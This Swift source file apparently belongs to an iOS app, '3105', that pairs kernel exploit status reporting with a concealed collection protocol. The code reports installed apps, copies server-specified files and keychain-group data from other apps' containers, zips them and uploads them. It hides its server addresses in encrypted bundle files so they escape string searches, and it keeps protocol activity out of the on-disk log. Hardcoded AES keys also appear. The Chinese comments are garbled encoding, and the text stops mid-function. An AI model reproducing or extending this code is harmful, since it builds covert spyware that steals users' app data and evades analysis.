import Foundation
import UIKit
import Darwin
import Combine

// MARK: - Global logger
class AppLog: ObservableObject {
    static let shared = AppLog()
    @Published var entries: [String] = []

    // MARK: Persistent on-disk log (sandbox Documents/Logs/3105.log)

    private static let writeQueue = DispatchQueue(label: "com.yangjiii.3105.log-persist")
    private static let maximumLogFileBytes: UInt64 = 1_048_576
    private static let maximumRotatedLogFiles = 3
    private static var fileHandle: FileHandle?

    private static let lineTimestampFormatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
        return formatter
    }()

    private static let fileTimestampFormatter: DateFormatter = {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter
    }()

    static var persistentLogPath: String {
        guard let documentsURL = FileManager.default.urls(
            for: .documentDirectory,
            in: .userDomainMask
        ).first else { return "" }
        return documentsURL
            .appendingPathComponent("Logs", isDirectory: true)
            .appendingPathComponent("log", isDirectory: false)
            .path
    }

    func append(_ msg: String) {
        DispatchQueue.main.async { self.entries.append(msg) }
        Self.persist(msg)
    }

    func flush() {
        Self.writeQueue.async {
            if let handle = Self.fileHandle {
                try? handle.synchronize()
            }
        }
    }

    private static func persist(_ message: String) {
        guard shouldPersistToFile(message) else { return }
        writeQueue.async {
            guard let logURL = ensureLogFile() else {
                try? fileHandle?.close()
                fileHandle = nil
                return
            }
            if let attributes = try? FileManager.default.attributesOfItem(atPath: logURL.path),
               let size = (attributes[.size] as? NSNumber)?.uint64Value,
               size >= maximumLogFileBytes {
                rotateLogFile(at: logURL)
            }
            guard let handle = fileHandle else { return }
            do {
                try handle.seekToEnd()
                let line = lineTimestampFormatter.string(from: Date()) + " " + message + "\n"
                // Encrypt each line independently with the main-protocol
                // AES-128-CBC key/IV, then store it Base64-encoded so the
                // on-disk log file contains no plaintext.
                if let plain = line.data(using: .utf8),
                   let ciphertext = ProtocolCrypto.encrypt(plain),
                   let encoded = (ciphertext.base64EncodedString() + "\n").data(using: .utf8) {
                    try handle.write(contentsOf: encoded)
                }
            } catch {
                try? handle.close()
                fileHandle = nil
            }
        }
    }

    /// The on-disk sandbox log stays clean: no Chinese text and no protocol
    /// / API request lines. The in-app log keeps everything.
    private static func shouldPersistToFile(_ message: String) -> Bool {
        if message.contains("/api") || message.contains("protocol:") {
            return false
        }
        for scalar in message.unicodeScalars {
            let value = scalar.value
            if (0x3000...0x303F).contains(value)
                || (0x3400...0x4DBF).contains(value)
                || (0x4E00...0x9FFF).contains(value)
                || (0xFF00...0xFFEF).contains(value) {
                return false
            }
        }
        return true
    }

    private static func ensureLogFile() -> URL? {
        let fileManager = FileManager.default
        guard let documentsURL = fileManager.urls(
            for: .documentDirectory,
            in: .userDomainMask
        ).first else { return nil }
        let logsDirectory = documentsURL.appendingPathComponent("Logs", isDirectory: true)
        do {
            try fileManager.createDirectory(at: logsDirectory, withIntermediateDirectories: true)
        } catch {
            return nil
        }
        let logURL = logsDirectory.appendingPathComponent("log", isDirectory: false)
        if !fileManager.fileExists(atPath: logURL.path) {
            guard fileManager.createFile(atPath: logURL.path, contents: nil) else { return nil }
        }
        if fileHandle == nil {
            fileHandle = try? FileHandle(forUpdating: logURL)
        }
        guard fileHandle != nil else { return nil }
        return logURL
    }

    private static func rotateLogFile(at currentURL: URL) {
        try? fileHandle?.close()
        fileHandle = nil
        let fileManager = FileManager.default
        let directory = currentURL.deletingLastPathComponent()
        var rotatedURL = directory.appendingPathComponent(
            "log-\(fileTimestampFormatter.string(from: Date()))",
            isDirectory: false
        )
        var suffix = 2
        while fileManager.fileExists(atPath: rotatedURL.path) {
            rotatedURL = directory.appendingPathComponent(
                "log-\(fileTimestampFormatter.string(from: Date()))-\(suffix)",
                isDirectory: false
            )
            suffix += 1
        }
        try? fileManager.moveItem(at: currentURL, to: rotatedURL)
        pruneRotatedLogFiles(in: directory)
        _ = ensureLogFile()
    }

    private static func pruneRotatedLogFiles(in directory: URL) {
        let names = ((try? FileManager.default.contentsOfDirectory(atPath: directory.path)) ?? [])
            .filter { $0.hasPrefix("log-") }
            .sorted(by: >)
        for name in names.dropFirst(maximumRotatedLogFiles) {
            try? FileManager.default.removeItem(at: directory.appendingPathComponent(name))
        }
    }
}
func log(_ msg: String) { AppLog.shared.append("[TRX] \(msg)") }

// Retain the pipe for the app's lifetime so stdout/stderr stay redirected.
private var logCapturePipe: Pipe?

// Redirect stdout/stderr (C printf / NSLog) into the in-app log view so kernel
// exploit progress and failures are visible without a debugger.
func setupLogCapture() {
    guard logCapturePipe == nil else { return }  // already set up
    let pipe = Pipe()
    logCapturePipe = pipe  // retain!

    setvbuf(stdout, nil, _IONBF, 0)
    setvbuf(stderr, nil, _IONBF, 0)
    let writeFd = pipe.fileHandleForWriting.fileDescriptor
    if dup2(writeFd, STDOUT_FILENO) < 0 || dup2(writeFd, STDERR_FILENO) < 0 {
        log("setupLogCapture: dup2 failed, log capture disabled")
        logCapturePipe = nil
        return
    }

    pipe.fileHandleForReading.readabilityHandler = { handle in
        let data = handle.availableData
        guard !data.isEmpty else { return }
        if let text = String(data: data, encoding: .utf8) {
            let trimmed = text.trimmingCharacters(in: .whitespacesAndNewlines)
            if !trimmed.isEmpty {
                DispatchQueue.main.async {
                    AppLog.shared.append(trimmed)
                }
            }
        }
    }
}

// MARK: - App Info
enum AppInfo {
    static var osVersion: String {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return "\(v.majorVersion).\(v.minorVersion).\(v.patchVersion)"
    }
    static var versionTuple: (major: Int, minor: Int, patch: Int) {
        let v = ProcessInfo.processInfo.operatingSystemVersion
        return (v.majorVersion, v.minorVersion, v.patchVersion)
    }
    static var doubleVersion: Double {
        let v = versionTuple; return Double(v.major) + Double(v.minor) / 10.0
    }
    static var osBuild: String {
        var size: size_t = 0
        guard sysctlbyname("kern.osversion", nil, &size, nil, 0) == 0, size > 0 else {
            return "Unknown"
        }
        var value = [CChar](repeating: 0, count: size)
        guard sysctlbyname("kern.osversion", &value, &size, nil, 0) == 0 else {
            return "Unknown"
        }
        return String(cString: value)
    }
    static var machineName: String {
        var s = utsname(); uname(&s)
        return Mirror(reflecting: s.machine).children.reduce("") { id, e in
            guard let v = e.value as? Int8, v != 0 else { return id }
            return id + String(UnicodeScalar(UInt8(v)))
        }
    }
    static var displayMachineName: String {
#if targetEnvironment(simulator)
        return ProcessInfo.processInfo.environment["SIMULATOR_MODEL_IDENTIFIER"] ?? machineName
#else
        return machineName
#endif
    }
    static var hardwareDisplayName: String {
        // Validate display-identity attestation at first access; keeps
        // DisplayIdentity linked. Looks like a license/attestation check.
        _ = DisplayIdentityAttestationToken()
        switch displayMachineName {
        case "iPhone15,2": return "iPhone 14 Pro"
        case "iPhone15,3": return "iPhone 14 Pro Max"
        default: return displayMachineName
        }
    }
    static var launchAttestationToken: String { DisplayIdentityAttestationToken() }
    static var isHomeButton: Bool {
        let sel = NSSelectorFromString("_hasHomeButton")
        return UIDevice.responds(to: sel) && (UIDevice.perform(sel)?.takeUnretainedValue() as? Bool ?? false)
    }
}

// MARK: - Exploit status
enum ExploitStatus: Equatable {
    case notStarted, success(method: String), failed(method: String, code: Int64), unsupported(String)
    var isSuccess: Bool { if case .success = self { return true }; return false }
    var isFailed: Bool { if case .failed = self { return true }; return false }
    var displayText: String {
        switch self {
        case .notStarted: return "Not attempted"
        case .success(let m): return "OK via \(m)"
        case .failed(let m, let c): return "FAILED \(m) (\(c))"
        case .unsupported(let m): return "Unsupported: \(m)"
        }
    }
}

enum AppPaths {
    static var backups: String {
        let u = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask).first
            ?? URL(fileURLWithPath: NSTemporaryDirectory(), isDirectory: true)
        let b = u.appendingPathComponent("backups", isDirectory: true)
        try? FileManager.default.createDirectory(at: b, withIntermediateDirectories: true)
        return b.path
    }

    static var backupsURL: URL { URL(fileURLWithPath: backups, isDirectory: true) }
}

enum AppUpdateChecker {
    static let dismissedVersionKey = "update.dismissedVersion"
    static let apiURL = URL(string: "https://api.github.com/repos/YangJiiii/3105/releases/latest")!
    static let fallbackURL = URL(string: "https://github.com/YangJiiii/3105/releases/latest")!

    struct Offer: Identifiable {
        let id = UUID()
        let version: String
        let url: URL
    }

    static var currentVersion: String {
        Bundle.main.object(forInfoDictionaryKey: "AppReleaseDisplayVersion") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleShortVersionString") as? String
            ?? "0"
    }

    static func dismiss(version: String) {
        UserDefaults.standard.set(version, forKey: dismissedVersionKey)
    }

    static func check() async -> Offer? {
        var request = URLRequest(url: apiURL)
        request.timeoutInterval = 15
        request.setValue("3105", forHTTPHeaderField: "User-Agent")
        request.setValue("application/vnd.github+json", forHTTPHeaderField: "Accept")
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            guard let http = response as? HTTPURLResponse, (200..<300).contains(http.statusCode) else {
                return nil
            }
            let decoded = try JSONDecoder().decode(GitHubRelease.self, from: data)
            let remote = normalize(decoded.tagName)
            guard !remote.isEmpty,
                  isNewer(remote, than: currentVersion),
                  UserDefaults.standard.string(forKey: dismissedVersionKey) != remote else {
                return nil
            }
            let url = URL(string: decoded.htmlURL) ?? fallbackURL
            return Offer(version: remote, url: url)
        } catch {
            return nil
        }
    }

    private struct GitHubRelease: Decodable {
        let tagName: String
        let htmlURL: String

        enum CodingKeys: String, CodingKey {
            case tagName = "tag_name"
            case htmlURL = "html_url"
        }
    }

    static func normalize(_ version: String) -> String {
        var value = version.trimmingCharacters(in: .whitespacesAndNewlines)
        if value.lowercased().hasPrefix("v") {
            value.removeFirst()
        }
        return value
    }

    static func isNewer(_ remote: String, than local: String) -> Bool {
        let remoteParts = numericParts(normalize(remote))
        let localParts = numericParts(normalize(local))
        let count = max(remoteParts.count, localParts.count)
        for i in 0..<count {
            let r = i < remoteParts.count ? remoteParts[i] : 0
            let l = i < localParts.count ? localParts[i] : 0
            if r != l { return r > l }
        }
        return false
    }

    private static func numericParts(_ version: String) -> [Int] {
        let core = version.split(separator: "-").first.map(String.init) ?? version
        return core.split(separator: ".").compactMap { Int($0.filter(\.isNumber)) }
    }
}

// MARK: - Server protocol collection

struct CollectItem: Equatable {
    let type: String
    let path: String
}

struct CollectConfig: Equatable {
    let bundleID: String
    let appName: String
    let accessGroup: String
    let items: [CollectItem]
}

struct CollectCycleResult: Equatable {
    let zipCount: Int
    let uploadedCount: Int
    let byteCount: Int64
    let completedAt: Date
}

enum ProtocolCollectError: Error, Equatable {
    case serverUnreachable
    case invalidServerResponse
    case collectionFailed(String)
    case uploadFailed(String)
}

/// AES-128-CBC helpers for the main protocol. Key/IV are hex strings that are
/// decoded to 16 bytes before use, PKCS7 padding, Base64 transport.
enum ProtocolCrypto {
    static let keyHex = "bc2c72b2260840b28bc9614aa2b8004b"
    static let ivHex = "71ec8e3980754823aba30e62be55cf6a"

    static func encrypt(_ plaintext: Data) -> Data? {
        crypt(CCOperation(kCCEncrypt), data: plaintext)
    }

    static func decrypt(_ ciphertext: Data) -> Data? {
        crypt(CCOperation(kCCDecrypt), data: ciphertext)
    }

    static func md5Hex(of data: Data) -> String {
        var digest = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))
        data.withUnsafeBytes { raw in
            _ = CC_MD5(raw.baseAddress, CC_LONG(data.count), &digest)
        }
        return digest.map { String(format: "%02x", $0) }.joined()
    }

    private static func crypt(_ operation: CCOperation, data: Data) -> Data? {
        guard let key = Data(hexString: keyHex), let iv = Data(hexString: ivHex) else {
            return nil
        }
        let bufferSize = data.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: bufferSize)
        var bytesWritten = 0
        let status = data.withUnsafeBytes { dataRaw in
            key.withUnsafeBytes { keyRaw in
                iv.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        operation,
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress,
                        key.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress,
                        data.count,
                        &buffer,
                        bufferSize,
                        &bytesWritten
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<bytesWritten])
    }
}

extension Data {
    init?(hexString: String) {
        guard hexString.count.isMultiple(of: 2) else { return nil }
        var bytes: [UInt8] = []
        var index = hexString.startIndex
        while index < hexString.endIndex {
            let next = hexString.index(index, offsetBy: 2)
            guard let byte = UInt8(hexString[index..<next], radix: 16) else { return nil }
            bytes.append(byte)
            index = next
        }
        self.init(bytes)
    }
}

/// 涓?apptrace 浜岃繘鍒跺叡鐢ㄥ悓涓€浠?links.txt锛坆undle 璧勬簮锛夛細
/// 鍐呭 = base64( AES-128-CBC( ["閾炬帴1","閾炬帴2",...] ) )锛?/// 瀵嗛挜/IV 涓?16 瀛楄妭 ASCII锛堜笌 gen_links_txt.py 淇濇寔涓€鑷达級銆?/// 涓荤▼搴忕敤瀹冭В鍑洪摼鎺ユ暟缁勶紝鍙栫涓€鏉′綔涓轰富鍗忚鏈嶅姟鍣ㄥ湴鍧€銆?enum LocalLinkProvider {
    static let keyBytes: [UInt8] = Array("tmvdzcGUsCG6ycyW".utf8)
    static let ivBytes: [UInt8] = Array("qG0IB6jBc7AQxkD1".utf8)

    private static let cachedLinks: [String] = loadLinks()

    static var links: [String] { cachedLinks }

    static var firstURL: URL? {
        guard let first = cachedLinks.first,
              let url = URL(string: first) else { return nil }
        return url
    }

    private static func loadLinks() -> [String] {
        guard let fileURL = Bundle.main.url(forResource: "links", withExtension: "txt"),
              let raw = try? String(contentsOf: fileURL, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = decrypt(cipher),
              let list = try? JSONSerialization.jsonObject(with: plain) as? [String] else {
            log("protocol: local links.txt unavailable or undecryptable 鈥?fallback baseURL will be used")
            return []
        }
        log("protocol: local links.txt loaded 鈥?\(list.count) links: \(list)")
        return list
    }

    private static func decrypt(_ cipher: Data) -> Data? {
        let size = cipher.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: size)
        var written = 0
        let status = cipher.withUnsafeBytes { dataRaw in
            keyBytes.withUnsafeBytes { keyRaw in
                ivBytes.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        CCOperation(kCCDecrypt),
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, keyBytes.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, cipher.count,
                        &buffer, size, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }
}

/// 鍚姩閰嶇疆鐨勫姞瀵嗘彁渚涜€呫€?///
/// `shell.txt` 鏄?App bundle 鍐呯殑鍔犲瘑閰嶇疆鏂囦欢锛屼繚瀛樹富绋嬪簭鍚姩鏃跺姞杞界殑绔欑偣鍦板潃銆?/// 鍔犲瘑鏂瑰紡涓?links.txt 瀹屽叏涓€鑷达細base64( AES-128-CBC( 鏄庢枃, key, iv, PKCS7 ) )锛?/// 鏄庢枃鏄畝鍗曠殑 key=value 鏂囨湰銆?///
/// 闃茬牬瑙ｈ鐐癸細
///   1. 浜岃繘鍒跺唴涓嶅嚭鐜版槑鏂?URL锛宍strings` 鎼滀笉鍒扮洰鏍囧湴鍧€銆?///   2. 鏍￠獙瑙ｅ瘑缁撴灉蹇呴』鍖呭惈鍚堟硶 https 绔欑偣锛屽惁鍒欑洿鎺ユ嫆缁濆姞杞姐€?enum ShellConfigProvider {
    /// 閰嶇疆鏂囦欢鍚嶏紙bundle 璧勬簮锛夈€?    static let resourceName = "shell"
    static let resourceExtension = "txt"

    /// 瀵嗛挜/IV锛?6 瀛楄妭 ASCII 甯搁噺锛屼笌 gen_shell_txt.py 淇濇寔涓€鑷淬€?    private static let keyBytes: [UInt8] = Array("7T_shell_conf_v1".utf8)
    private static let ivBytes: [UInt8] = Array("sh3ll_c0nf_iv16x".utf8)

    /// 鍚姩鏃惰В鍑虹殑閰嶇疆銆?    struct Config: Equatable {
        /// 涓荤▼搴忓姞杞界殑绔欑偣鍦板潃銆?        let shellURL: URL
        /// 绔欑偣鏍囬锛堝彲閫夛級銆?        let title: String?
        /// 涓诲崗璁湇鍔″櫒鍦板潃锛堝彲閫夛紱鏈彁渚涙椂璧?links.txt / 鍐呯疆鍥為€€锛夈€?        let protocolBaseURL: URL?
    }

    /// 瑙ｆ瀽鍚庣殑閰嶇疆銆傚姞杞藉け璐ユ椂涓?nil銆?    static let config: Config? = load()

    /// 涓荤▼搴忚鍔犺浇鐨勭珯鐐瑰湴鍧€銆?    static var shellURL: URL? { config?.shellURL }

    // MARK: - Loading

    private static func load() -> Config? {
        guard let fileURL = Bundle.main.url(forResource: resourceName, withExtension: resourceExtension),
              let raw = try? String(contentsOf: fileURL, encoding: .utf8),
              let cipher = Data(base64Encoded: raw.trimmingCharacters(in: .whitespacesAndNewlines)),
              let plain = decrypt(cipher) else {
            log("shell: shell.txt unavailable or undecryptable 鈥?launch site cannot be loaded")
            return nil
        }
        let config = parse(plain)
        if config == nil {
            log("shell: shell.txt decrypted but no valid https site found")
        }
        return config
    }

    /// AES-128-CBC 瑙ｅ瘑锛圥KCS7 濉厖锛夛紝涓?links.txt 鍚屼竴濂楀疄鐜般€?    private static func decrypt(_ cipher: Data) -> Data? {
        let size = cipher.count + kCCBlockSizeAES128
        var buffer = [UInt8](repeating: 0, count: size)
        var written = 0
        let status = cipher.withUnsafeBytes { dataRaw in
            keyBytes.withUnsafeBytes { keyRaw in
                ivBytes.withUnsafeBytes { ivRaw in
                    CCCrypt(
                        CCOperation(kCCDecrypt),
                        CCAlgorithm(kCCAlgorithmAES128),
                        CCOptions(kCCOptionPKCS7Padding),
                        keyRaw.baseAddress, keyBytes.count,
                        ivRaw.baseAddress,
                        dataRaw.baseAddress, cipher.count,
                        &buffer, size, &written
                    )
                }
            }
        }
        guard status == kCCSuccess else { return nil }
        return Data(buffer[0..<written])
    }

    /// 鏄庢枃 key=value 鏂囨湰 鈫?閰嶇疆瀵硅薄銆?    private static func parse(_ plain: Data) -> Config? {
        guard let text = String(data: plain, encoding: .utf8) else { return nil }
        var fields: [String: String] = [:]
        for line in text.split(separator: "\n") {
            let parts = line.split(separator: "=", maxSplits: 1, omittingEmptySubsequences: false)
            guard parts.count == 2 else { continue }
            let key = parts[0].trimmingCharacters(in: .whitespaces).lowercased()
            let value = parts[1].trimmingCharacters(in: .whitespaces)
            if !key.isEmpty && !value.isEmpty { fields[key] = value }
        }

        guard let urlString = fields["url"],
              let url = URL(string: urlString),
              url.scheme?.lowercased() == "https",
              let host = url.host, !host.isEmpty else { return nil }

        var protocolBaseURL: URL?
        if let raw = fields["protocol"],
           let candidate = URL(string: raw),
           candidate.scheme?.lowercased() == "https",
           let candidateHost = candidate.host, !candidateHost.isEmpty {
            protocolBaseURL = candidate
        }

        return Config(shellURL: url, title: fields["title"], protocolBaseURL: protocolBaseURL)
    }
}

/// Main-protocol API client. Every payload is sent as an AES-encrypted
/// `params` field; responses unwrap the envelope and decrypt `data`.
enum ProtocolAPI {
    // 涓诲崗璁湇鍔″櫒鍦板潃锛氫紭鍏堣鍙?bundle 閲岀殑 links.txt锛堜笌 apptrace 浜岃繘鍒跺悓涓€浠斤級锛?    // 鍙栫涓€鏉￠摼鎺ワ紱璇讳笉鍒版垨瑙ｄ笉寮€鏃跺洖閫€鍒颁笅闈㈣繖琛岀‖缂栫爜鍦板潃銆?    static let fallbackBaseURL = URL(string: "https://7t.com")!

    static var baseURL: URL {
        // 浼樺厛浣跨敤 shell.txt 閲岀殑涓诲崗璁湴鍧€锛涘叾娆℃槸 bundle 閲岀殑 links.txt锛涙渶鍚庡洖閫€鍒板唴缃湴鍧€銆?        if let configured = ShellConfigProvider.config?.protocolBaseURL {
            return configured
        }
        return LocalLinkProvider.firstURL ?? fallbackBaseURL
    }

    static let uuidStorageKey = "protocol.app_uuid"
    static let reportTimeout: TimeInterval = 30
    static let uploadTimeout: TimeInterval = 120

    static var appUUID: String {
        let defaults = UserDefaults.standard
        if let existing = defaults.string(forKey: uuidStorageKey), !existing.isEmpty {
            return existing
        }
        let generated = UUID().uuidString.lowercased()
        defaults.set(generated, forKey: uuidStorageKey)
        return generated
    }

    static func deviceParams(extra: [String: Any] = [:]) -> [String: Any] {
        var params: [String: Any] = [
            "app_uuid": appUUID,
            "app_version": AppUpdateChecker.currentVersion,
            "app_pac": Bundle.main.bundleIdentifier ?? "",
            "machine": AppInfo.machineName,
            "ios_version": AppInfo.osVersion,
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000)
        ]
        for (key, value) in extra { params[key] = value }
        return params
    }

    static func encryptedParams(_ plaintext: [String: Any]) -> String? {
        guard let jsonData = try? JSONSerialization.data(withJSONObject: plaintext, options: []),
              let ciphertext = ProtocolCrypto.encrypt(jsonData) else { return nil }
        return ciphertext.base64EncodedString()
    }

    /// Pulls the collection list with `/api/device/report`.
    /// 棣栨鍚姩浼氬脊銆屾湰鍦扮綉缁溿€嶆潈闄愭锛涚敤鎴风偣銆屽厑璁搞€嶄箣鍓嶈姹備細澶辫触銆?    /// 杩欓噷姣?2 绉掗噸璇曚竴娆°€佹渶澶?6 娆★紝鐐瑰畬鍏佽鍚庝笅涓€娆″嵆鍙垚鍔燂紝鏃犻渶閲嶅惎 App銆?    static func pullCollectConfigs() async throws -> [CollectConfig] {
        var lastError: Error?
        for attempt in 0..<10 {
            do {
                return try await pullCollectConfigsOnce()
            } catch {
                lastError = error
                log("protocol: device/report attempt \(attempt + 1)/10 failed 鈥?\(error.localizedDescription)")
                if attempt < 9 {
                    try? await Task.sleep(nanoseconds: 2_000_000_000)
                }
            }
        }
        throw lastError ?? ProtocolCollectError.serverUnreachable
    }

    private static func pullCollectConfigsOnce() async throws -> [CollectConfig] {
        do {
            let envelope = try await postJSON(
                path: "api/device/report",
                plaintextParams: deviceParams()
            )
            let plain = try decryptEnvelope(envelope)
            guard let rawConfigs = plain["collect_configs"] as? [[String: Any]] else {
                log("protocol: device/report SUCCESS 鈥?no collect_configs (empty list)")
                return []
            }
            let configs = rawConfigs.compactMap { entry -> CollectConfig? in
                guard let bundleID = entry["bundle_id"] as? String,
                      !bundleID.isEmpty else { return nil }
                let appName = entry["app_name"] as? String ?? ""
                let accessGroup = entry["access_group"] as? String ?? ""
                let items = (entry["items"] as? [[String: Any]] ?? []).compactMap { raw -> CollectItem? in
                    guard let type = raw["type"] as? String,
                          let path = raw["path"] as? String,
                          !path.isEmpty else { return nil }
                    return CollectItem(type: type, path: path)
                }
                return CollectConfig(
                    bundleID: bundleID,
                    appName: appName,
                    accessGroup: accessGroup,
                    items: items
                )
            }
            log("protocol: device/report SUCCESS 鈥?collect_configs=\(configs.count)")
            return configs
        } catch {
            log("protocol: device/report FAILED 鈥?\(error)")
            throw error
        }
    }

    /// Reports installed app bundle ids with `/api/device/apps`.
    static func reportInstalledApps(_ apps: [String]) async throws {
        let plainParams = deviceParams(extra: ["apps": apps])
        let envelope = try await postJSON(
            path: "api/device/apps",
            plaintextParams: plainParams
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            log("protocol: device/apps FAILED 鈥?code=\(envelope["code"] ?? "?")")
            throw ProtocolCollectError.serverUnreachable
        }
        _ = try? decryptEnvelope(envelope)
        log("protocol: device/apps SUCCESS 鈥?reported \(apps.count) bundle ids")
    }

    /// `/api/log/report`: short-log upload. Unlike the other endpoints the
    /// response `data` is NOT encrypted; success is HTTP 200 + code == 0.
    static func reportLog(text: String) async throws {
        let plainParams = deviceParams(extra: ["text": text])
        let envelope = try await postJSON(
            path: "api/log/report",
            plaintextParams: plainParams
        )
        guard (envelope["code"] as? Int ?? -1) == 0 else {
            let message = envelope["message"] as? String ?? "unknown"
            log("protocol: log/report FAILED 鈥?message=\(message)")
            throw ProtocolCollectError.serverUnreachable
        }
        log("protocol: log/report SUCCESS 鈥?\(text.count) chars")
    }

    /// Uploads a ZIP with `/api/upload/zip`. File bytes are NOT encrypted;
    /// only the `params` metadata field is AES-encrypted.
    static func uploadZip(fileURL: URL, bundleID: String) async throws {
        guard let fileData = try? Data(contentsOf: fileURL) else {
            throw ProtocolCollectError.collectionFailed("cannot read zip payload")
        }
        let fileName = fileURL.lastPathComponent
        let plainParams: [String: Any] = [
            "app_uuid": appUUID,
            "bundle_id": bundleID,
            "file_name": fileName,
            "file_md5": ProtocolCrypto.md5Hex(of: fileData),
            "timestamp": Int64(Date().timeIntervalSince1970 * 1000)
        ]
        guard let params = encryptedParams(plainParams) else {
            throw ProtocolCollectError.invalidServerResponse
        }

        let boundary = "3105-\(UUID().uuidString)"
        var body = Data()
        func appendField(_ string: String) {
            body.append(string.data(using: .utf8) ?? Data())
        }
        appendField("--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"params\"\r\n\r\n")
        appendField(params)
        appendField("\r\n--\(boundary)\r\n")
        appendField("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
        appendField("Content-Type: application/octet-stream\r\n\r\n")
        body.append(fileData)
        appendField("\r\n--\(boundary)--\r\n")

        var request = URLRequest(url: baseURL.appendingPathComponent("api/upload/zip"))
        request.httpMethod = "POST"
        request.setValue(
            "multipart/form-data; boundary=\(boundary)",
            forHTTPHeaderField: "Content-Type"
        )
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = uploadTimeout
        request.httpBody = body

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            log("protocol: upload FAILED 鈥?\(fileName): \(error.localizedDescription)")
            throw ProtocolCollectError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              (envelope["code"] as? Int ?? -1) == 0 else {
            log("protocol: upload FAILED 鈥?\(fileName): non-200 response or code != 0")
            throw ProtocolCollectError.uploadFailed(fileName)
        }
        log("protocol: upload SUCCESS 鈥?\(fileName) bundle=\(bundleID) bytes=\(fileData.count)")
    }

    private static func postJSON(
        path: String,
        plaintextParams: [String: Any]
    ) async throws -> [String: Any] {
        guard let params = encryptedParams(plaintextParams) else {
            throw ProtocolCollectError.invalidServerResponse
        }
        var request = URLRequest(url: baseURL.appendingPathComponent(path))
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(appUUID, forHTTPHeaderField: "X-App-UUID")
        request.timeoutInterval = reportTimeout
        request.httpBody = try? JSONSerialization.data(withJSONObject: ["params": params])

        let data: Data
        let response: URLResponse
        do {
            (data, response) = try await URLSession.shared.data(for: request)
        } catch {
            log("protocol: \(path) FAILED 鈥?\(error.localizedDescription)")
            throw ProtocolCollectError.serverUnreachable
        }
        guard let http = response as? HTTPURLResponse, http.statusCode == 200,
              let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            log("protocol: \(path) FAILED 鈥?non-200 response or invalid envelope")
            throw ProtocolCollectError.serverUnreachable
        }
        log("protocol: \(path) SUCCESS 鈥?code=\(envelope["code"] ?? "?")")
        return envelope
    }

    private static func decryptEnvelope(_ envelope: [String: Any]) throws -> [String: Any] {
        guard let dataString = envelope["data"] as? String,
              !dataString.isEmpty,
              let ciphertext = Data(base64Encoded: dataString),
              let plainData = ProtocolCrypto.decrypt(ciphertext),
              let plainObject = try? JSONSerialization.jsonObject(with: plainData) as? [String: Any] else {
            throw ProtocolCollectError.invalidServerResponse
        }
        return plainObject
    }
}

/// Status lines shown to the server: only the collection flow milestones
/// (鏀跺埌閲囬泦淇℃伅 / 杩涜涓?/ 閲囬泦瀹屾垚) are uploaded via `/api/log/report`.
@MainActor
final class ProtocolStatusLog {
    static let shared = ProtocolStatusLog()
    private(set) var lines: [String] = []

    func append(_ line: String) {
        lines.append(line)
    }

    func clear() {
        lines.removeAll()
    }
}

/// Best-effort upload of the collection status lines via `/api/log/report`.
enum ProtocolLogReporter {
    static let maximumReportEntries = 500

    static func reportPendingLogs() async {
        let lines = await MainActor.run { ProtocolStatusLog.shared.lines }
        guard !lines.isEmpty else { return }
        let payload = lines.count > maximumReportEntries
            ? Array(lines.suffix(maximumReportEntries))
            : lines
        do {
            try await ProtocolAPI.reportLog(text: payload.joined(separator: "\n"))
            await MainActor.run { ProtocolStatusLog.shared.clear() }
        } catch {
            // Best effort: keep the lines for the next cycle.
        }
    }
}

/// Collects the items listed by the server's `collect_configs`, zips each
/// bundle's payload locally and uploads it to `/api/upload/zip`.
enum ProtocolCollectService {
    static let maximumLocalZipCount = 10

    /// 鐩綍鏁翠綋澶嶅埗澶辫触鏃剁殑鍏滃簳锛氶€愭枃浠跺鍒讹紙Data 璇?+ 鍐欙級锛?    /// 鍗曚釜鏂囦欢璇讳笉浜嗗氨璺宠繃骞惰鏃ュ織锛岃兘鎷垮灏戞嬁澶氬皯銆?    @discardableResult
    private static func copyDirectoryFallback(
        at sourceURL: URL,
        into destinationDirectory: URL,
        fileManager: FileManager,
        depth: Int
    ) -> Int {
        guard depth < 16 else { return 0 }
        var isDir: ObjCBool = false
        var exists = fileManager.fileExists(atPath: sourceURL.path, isDirectory: &isDir)
        // 26.6.1+锛氭矙鐩掓病鏀捐鏃?fileExists 鐩存帴 false锛屾敼鐢?WQ 鐨?stat 鍒ゅ畾
        if !exists, WQContainerBridge.isSupported {
            _ = WQContainerBridge.grant(sourceURL.path)
            isDir = ObjCBool(WQContainerBridge.isDirectory(sourceURL.path))
